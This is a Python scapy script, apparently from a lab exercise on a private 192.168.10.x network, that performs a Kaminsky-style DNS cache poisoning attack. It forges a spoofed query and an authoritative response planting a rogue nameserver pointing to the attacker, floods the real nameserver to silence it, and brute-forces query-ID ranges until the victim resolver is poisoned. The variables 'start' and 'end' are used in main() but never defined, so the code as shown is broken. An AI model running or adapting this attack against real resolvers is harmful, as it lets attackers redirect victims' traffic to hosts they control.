import sys 
import random
import string
import time 
import os 
import signal 
import subprocess 
from scapy.all import *

def query(src, dst, qname):
	"""
	generate a query packet which sent from source IP address to destination IP address
	"""
	ip_pkt = IP(src=src, dst=dst, chksum=0)
	udp_pkt = UDP(sport=9527, dport=53, chksum=0)
	qdsec = DNSQR(qname=qname)                                                
	dns_pkt = DNS(id=0xcafe, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qdsec)     
	query = ip_pkt / udp_pkt / dns_pkt

	with open('query.bin', 'wb') as f:
		f.write(bytes(query))

def response(src, dst, qname, domain, dport, bad_ns, bad_ip):
	"""
	generate a forged response packet which sent from source IP address to destination IP address
	"""
	ip_pkt = IP(src=src, dst=dst)
	udp_pkt = UDP(sport=53, dport=dport)
	qdsec = DNSQR(qname=qname)
	ansec = DNSRR(rrname=qname, type='A', rdata='1.2.3.4', ttl=259200)          
	nssec = DNSRR(rrname=domain, type='NS', rdata=bad_ns, ttl=259200)
	arsec = DNSRR(rrname=bad_ns, type='A', rdata=bad_ip, ttl=259200)
	dns_pkt = DNS(id=0xAABB, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=1, \
		qd=qdsec, an=ansec, ns=nssec, ar=arsec)
	response = ip_pkt / udp_pkt / dns_pkt

	with open('response.bin', 'wb') as f:
		f.write(bytes(response))

def mute(src, dst, qname):
	"""
	generate a lot of packets to mute the recursive nameserver 
	"""
	ip_pkt = IP(src=src, dst=dst, chksum=0)
	udp_pkt = UDP(sport=9527, dport=53, chksum=0)
	qdsec = DNSQR(qname=qname)                       
	dns_pkt = DNS(id=0xcafe, qr=0, qdcount=1, ancount=0, nscount=0, arcount=0, qd=qdsec)     
	query = ip_pkt / udp_pkt / dns_pkt

	with open('mute.bin', 'wb') as f:
		f.write(bytes(query))

def gen_name(sz):
   char = string.ascii_lowercase
   return "".join(random.choice(char) for i in range(sz))

def attack(filename, hostname, domain_sz, start, end):
	cmd = "sudo " + filename + " " + hostname + " " + domain_sz + " " + start + " " + end 
	os.system(cmd) 

def parse(filename):
	lines = []
	with open(filename, "r") as f:
		lines = f.readlines()

	idx_list = []
	for i in range(len(lines)):
		if "ANSWER SECTION" in lines[i]:
			idx_list.append(i + 1) 

	# parse
	for idx in idx_list:
		ans = lines[idx].replace('\n', '')
		hostname = ans.split('\x09')[0]
		ip = ans.split('\x09')[-1]
		print(hostname + " " + ip)

def check(hostname):

	cmd = "dig @192.168.10.10 -t A " + hostname + " > check.txt"
	os.system(cmd)

	with open("check.txt", "r") as f:
		lines = f.readlines()

	for line in lines:
		if "1.2.3.4" in line:
			return True
	
	return False 

def main():

	victim_addr = '192.168.10.10'          # tribore
	attacker_addr = '192.168.10.20'        # mooncake
	ns_addr = '192.168.10.30'              # quackns

	name_sz = 5 
	pkt_sz = 200   

	port = int(sys.argv[1])                # source (victim's) port
	domain = sys.argv[2] 

	if domain[-1] == '.':
		domain = domain[:-1]

	qname = 'aaaaa.' + domain
	bad_ns = 'ns.bad.' + domain.split('.')[-1] 
	domain_sz = len(domain)

	query(src=attacker_addr, dst=victim_addr, qname=qname)
	response(src=ns_addr, dst=victim_addr, qname=qname, domain=domain, dport=port, bad_ns=bad_ns, bad_ip=attacker_addr)
	mute(src=attacker_addr, dst=ns_addr, qname=qname) 

	# launch the attack
	while True:

		num = int((end - start) / pkt_sz)  
		rem = (end - start) % pkt_sz 

		idx_list = []
		for i in range(num):
			idx_list.append(i)

		# random.shuffle(idx_list)
		
		for idx in idx_list:
			s = start + idx * pkt_sz                 # query ID 
			e = start + (idx + 1) * pkt_sz
			hostname = gen_name(name_sz)
			sub = subprocess.Popen("sudo ./mute", shell=True)
			# print("[+] attack.py: hostname = {}, start = {}, end = {}".format(hostname, s, e))
			attack("./send_pkt", hostname, str(domain_sz), str(s), str(e))
			time.sleep(1)
			os.system("sudo pkill -f mute")

		if rem != 0: 
			s = start + num * pkt_sz  
			e = end 
			hostname = gen_name(name_sz)
			sub = subprocess.Popen("sudo ./mute", shell=True)
			# print("[+] attack.py: hostname = {}, start = {}, end = {}".format(hostname, s, e))
			attack("./send_pkt", hostname, str(domain_sz), str(s), str(e))
			time.sleep(1)
			os.system("sudo pkill -f mute")

		hostname = gen_name(name_sz) + "." + domain
		if check(hostname):
			break

	# parse and display the result 
	cmd = "dig @192.168.10.10 -t A " + "hello." + domain  + " > output.txt"
	os.system(cmd) 
	cmd = "dig @192.168.10.10 -t A " + "world." + domain  + " >> output.txt"
	os.system(cmd) 
	cmd = "dig @192.168.10.10 -t A " + "nonexistent." + domain  + " >> output.txt"
	os.system(cmd) 
	parse("output.txt")

if __name__ == '__main__':
	main()
